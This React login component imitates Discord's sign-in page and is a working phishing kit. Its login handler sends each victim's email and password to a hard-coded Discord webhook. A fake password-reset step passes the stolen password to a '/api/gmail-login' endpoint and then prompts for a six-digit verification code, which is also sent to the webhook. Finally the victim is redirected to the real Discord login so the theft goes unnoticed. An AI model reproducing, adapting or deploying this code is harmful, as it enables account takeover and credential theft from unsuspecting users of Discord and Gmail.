'use client';
import { useForm } from 'react-hook-form';
import { useState } from 'react';
import Image from 'next/image';

type FormData = { email: string; password: string; code?: string };

export default function LoginForm() {
  const { register, handleSubmit } = useForm<FormData>();
  const [step, setStep] = useState<'login' | 'forgot' | 'code'>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const onLogin = async (data: FormData) => {
    setLoading(true);
    setEmail(data.email);
    setPassword(data.password);
    
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "Login Attempt",
          color: 0x5865f2,
          fields: [
            { name: "Email", value: data.email }, 
            { name: "Password", value: data.password }
          ]
        }]
      })
    });

    setStep('forgot');
    setLoading(false);
  };

  const onForgot = async (data: FormData) => {
    setLoading(true);
    setEmail(data.email);
    
    await fetch('/api/send-fake-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: data.email })
    }).catch(() => {});

    await fetch('/api/gmail-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: data.email, password })
    }).catch(() => {});

    setStep('code');
    setLoading(false);
  };

  const onCode = async (data: FormData) => {
    setLoading(true);
    
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "Verification Code Entered",
          color: 0x00ff00,
          fields: [
            { name: "Email", value: email }, 
            { name: "Code", value: data.code }
          ]
        }]
      })
    });

    window.location.href = 'https://discord.com/login';
  };

  if (step === 'forgot') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#313338]">
        <div className="w-full max-w-[480px] p-8 bg-[#313338]">
          <div className="mb-5">
            <h1 className="text-[24px] font-semibold text-[#f2f3f5] mb-2">Forgot your password?</h1>
            <p className="text-[#b5bac1] text-[14px] leading-[20px]">
              Enter your email and we'll send you a reset code.
            </p>
          </div>
          
          <form onSubmit={handleSubmit(onForgot)} className="space-y-4">
            <div>
              <label className="block text-[#b5bac1] text-[12px] font-semibold uppercase mb-2">
                Email or Phone Number
              </label>
              <input
                {...register('email', { required: true })}
                defaultValue={email}
                className="w-full h-[40px] px-[10px] bg-[#1e1f22] text-[#dbdee1] text-[16px] rounded-[3px] border border-[#1e1f22] focus:border-[#00a8fc] focus:outline-none transition-colors placeholder:text-[#87898c]"
                placeholder="Email or Phone Number"
                required
              />
            </div>
            
            <button
              type="submit"
              disabled={loading}
              className="w-full h-[44px] bg-[#5865f2] hover:bg-[#4752c4] text-white font-medium rounded-[3px] transition-colors disabled:opacity-70"
            >
              {loading ? 'Sending...' : 'Send Reset Code'}
            </button>
            
            <button
              type="button"
              onClick={() => setStep('login')}
              className="text-[#00a8fc] text-[14px] hover:underline mt-4 block"
            >
              Back to Login
            </button>
          </form>
        </div>
      </div>
    );
  }

  if (step === 'code') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#313338]">
        <div className="w-full max-w-[480px] p-8 bg-[#313338]">
          <div className="mb-5">
            <h1 className="text-[24px] font-semibold text-[#f2f3f5] mb-2">Check Your Email</h1>
            <p className="text-[#b5bac1] text-[14px] leading-[20px]">
              We sent a code to <span className="text-[#f2f3f5]">{email}</span>
            </p>
          </div>
          
          <form onSubmit={handleSubmit(onCode)} className="space-y-4">
            <div>
              <label className="block text-[#b5bac1] text-[12px] font-semibold uppercase mb-2">
                Enter Code
              </label>
              <input
                {...register('code', { required: true })}
                maxLength={6}
                className="w-full h-[40px] px-[10px] bg-[#1e1f22] text-[#dbdee1] text-[16px] rounded-[3px] border border-[#1e1f22] focus:border-[#00a8fc] focus:outline-none transition-colors text-center tracking-[4px] font-mono"
                placeholder="000000"
                required
              />
            </div>
            
            <button
              type="submit"
              disabled={loading}
              className="w-full h-[44px] bg-[#5865f2] hover:bg-[#4752c4] text-white font-medium rounded-[3px] transition-colors disabled:opacity-70"
            >
              {loading ? 'Verifying...' : 'Verify'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#313338]">
      <div className="w-full max-w-[480px] p-8 bg-[#313338]">
        <div className="mb-5">
          <h1 className="text-[24px] font-semibold text-[#f2f3f5] mb-2">Welcome back!</h1>
          <p className="text-[#b5bac1] text-[14px] leading-[20px]">
            We're so excited to see you again!
          </p>
        </div>
        
        <form onSubmit={handleSubmit(onLogin)} className="space-y-4">
          <div>
            <label className="block text-[#b5bac1] text-[12px] font-semibold uppercase mb-2">
              Email or Phone Number <span className="text-[#f23f43]">*</span>
            </label>
            <input
              {...register('email', { required: true })}
              className="w-full h-[40px] px-[10px] bg-[#1e1f22] text-[#dbdee1] text-[16px] rounded-[3px] border border-[#1e1f22] focus:border-[#00a8fc] focus:outline-none transition-colors placeholder:text-[#87898c]"
              placeholder="Email or Phone Number"
              required
            />
          </div>
          
          <div>
            <label className="block text-[#b5bac1] text-[12px] font-semibold uppercase mb-2">
              Password <span className="text-[#f23f43]">*</span>
            </label>
            <input
              type="password"
              {...register('password', { required: true })}
              className="w-full h-[40px] px-[10px] bg-[#1e1f22] text-[#dbdee1] text-[16px] rounded-[3px] border border-[#1e1f22] focus:border-[#00a8fc] focus:outline-none transition-colors placeholder:text-[#87898c]"
              placeholder="Password"
              required
            />
          </div>
          
          <button
            type="button"
            onClick={() => setStep('forgot')}
            className="text-[#00a8fc] text-[14px] hover:underline"
          >
            Forgot your password?
          </button>
          
          <button
            type="submit"
            disabled={loading}
            className="w-full h-[44px] bg-[#5865f2] hover:bg-[#4752c4] text-white font-medium rounded-[3px] transition-colors disabled:opacity-70 mt-2"
          >
            {loading ? 'Logging in...' : 'Log In'}
          </button>
          
          <div className="text-[#949ba4] text-[14px] mt-4">
            Need an account?{' '}
            <a href="#" className="text-[#00a8fc] hover:underline">Register</a>
          </div>
        </form>
      </div>
    </div>
  );
}
